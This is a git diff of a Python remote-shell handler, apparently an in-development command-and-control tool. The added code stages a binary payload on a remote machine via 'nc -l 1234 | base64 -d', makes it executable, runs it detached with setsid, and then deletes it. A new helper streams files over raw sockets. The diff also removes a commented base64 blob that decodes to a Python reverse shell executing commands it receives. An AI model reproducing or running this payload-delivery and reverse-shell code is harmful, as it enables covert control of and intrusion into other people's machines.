@@ -2,6 +2,7 @@
 
 from nethelper import ServerSocket, pretty, netshell_loop
 from threading import Thread
+from base64 import b64encode
 import logging
 import socket
 import time
@@ -42,6 +43,16 @@ def listen(line, py_state):
         return
 
     return sock
+
+def send_file(file_name, ip, port):
+    with open(file_name, 'rb') as f:
+        binary_data = f.read()
+
+    base64_data = b64encode(binary_data)
+    s = socket.socket()
+    s.connect((ip, port))
+    s.sendall(base64_data)
+    s.close()
 
 class NetShell(cmd.Cmd):
     def __init__(self, server):
@@ -102,19 +113,22 @@ class NetShell(cmd.Cmd):
 
     def do_ls(self, line):
         if not line:
-            pwd = pretty(self.server.send_command("pwd"))
+            path = pretty(self.server.send_command("pwd"))
             ls = pretty(self.server.send_command("ls -la"))
         else:
-            old_path = pretty(self.server.send_command("pwd"))
-            cd = pretty(self.server.send_command(f"cd {line}"))
-            if "no such file or directory" in cd.lower():
+            if line[0] == "-":
+                logging.error("um dont do that. placeholder text.")
+                return
+            ls = pretty(self.server.send_command(f"ls -la {line}"))
+            if "no such file or directory" in ls.lower():
                 logging.error("No such file or directory")
                 return
-            pwd = pretty(self.server.send_command("pwd"))
-            ls = pretty(self.server.send_command(f"ls -la"))
-            self.server.send_command(f"cd {old_path}".strip())
+            if line == "/":
+                path = "root folder"
+            else:
+                path = pretty(self.server.send_command(f"realpath {line}"))
 
-        sys.stdout.write(f"{pwd}\n{'=' * (len(pwd))}\n\n{ls}\n\n")
+        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n\n")
 
     def do_run(self, line):
         self.output = self.server.send_command(line, wt_output=False)
@@ -162,17 +176,22 @@ class LocalShell(cmd.Cmd):
         if not sock:
             return
         
-        logging.info(f"Sending payload..")
-        # encoded_data = "aW1wb3J0IHRpbWUKaW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKZGVmIGNvbm5lY3RfdG9faG9zdChob3N0LCBwb3J0KToKICAgIGZvciBpIGluIHJhbmdlKDUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgICAgICAgcy5jb25uZWN0KChob3N0LCBwb3J0KSkKICAgICAgICAgICAgcmV0dXJuIHMKICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICAgICBwcmludChmIkF0dGVtcHQge2krMX06IENvbm5lY3Rpb24gZmFpbGVkLiBSZXRyeWluZy4uLiIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkgICMgd2FpdCBmb3IgNSBzZWNvbmRzIGJlZm9yZSByZXRyeWluZwogICAgcHJpbnQoIkNvdWxkIG5vdCBlc3RhYmxpc2ggY29ubmVjdGlvbi4gRXhpdGluZy4uLiIpCiAgICBleGl0KCkKCmRlZiBleGVjdXRlX2NvbW1hbmQocyk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGRhdGEgPSBzLnJlY3YoMTAyNCkKICAgICAgICBwcmludChkYXRhKQogICAgICAgIGlmIGRhdGEuZGVjb2RlKCJ1dGYtOCIpID09ICdxdWl0JzoKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YS5kZWNvZGUoInV0Zi04IiksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkKICAgICAgICBzdGRvdXRfdmFsdWUgPSBwcm9jLnN0ZG91dC5yZWFkKCkgKyBwcm9jLnN0ZGVyci5yZWFkKCkKICAgICAgICBzLnNlbmQoc3Rkb3V0X3ZhbHVlKQoKZGVmIG1haW4oKToKICAgIGhvc3QgPSAnbG9jYWxob3N0JwogICAgcG9ydCA9IDQyNDIKICAgIHMgPSBjb25uZWN0X3RvX2hvc3QoaG9zdCwgcG9ydCkKICAgIGV4ZWN1dGVfY29tbWFuZChzKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQ=="
-        # sock.client_socket.send(f"echo -n {encoded_data} | base64 --decode > payload.py".encode())
-        sock.client_socket.send("setsid sh -c 'sleep 5 && python3 /home/pi/opt/testfolder/payload.py > test.txt'".encode())
-        sock.server_socket.close()
-        sock.client_socket.close()
-
-        sock = listen(line, 1)
-        # sock.client_socket.send(b"test\n")
-
-        # print(pyclient)
+        is_py = sock.send_command("which python").decode().strip()
+        is_py3 = sock.send_command("which python3").decode().strip()
+        
+        if "_3X1T_5TATUS=0" in is_py3: #BUG: ls command doesnt work when using pyclient
+            logging.info(f"Sending payload..")
+            sock.client_socket.send(b"touch payload\n")
+            sock.client_socket.send(b"chmod +x payload\n")
+            sock.client_socket.send(b"setsid sh -c 'nc -l 1234 | base64 -d > payload && sleep 5 && /home/pi/opt/testfolder/payload'\n") # TODO: then base64 out of it
+            sock.server_socket.close()
+            sock.client_socket.close()
+            send_file("payload", "localhost", 1234)
+            logging.info(f"Payload sent. Starting listener..")
+            sock = listen(line, 1)
+            sock.client_socket.send(b"rm -rf payload\n")
+        else:
+            logging.error("Python was not found. Using shell as client.")
 
         self.currentSession = NetShell(sock)
 
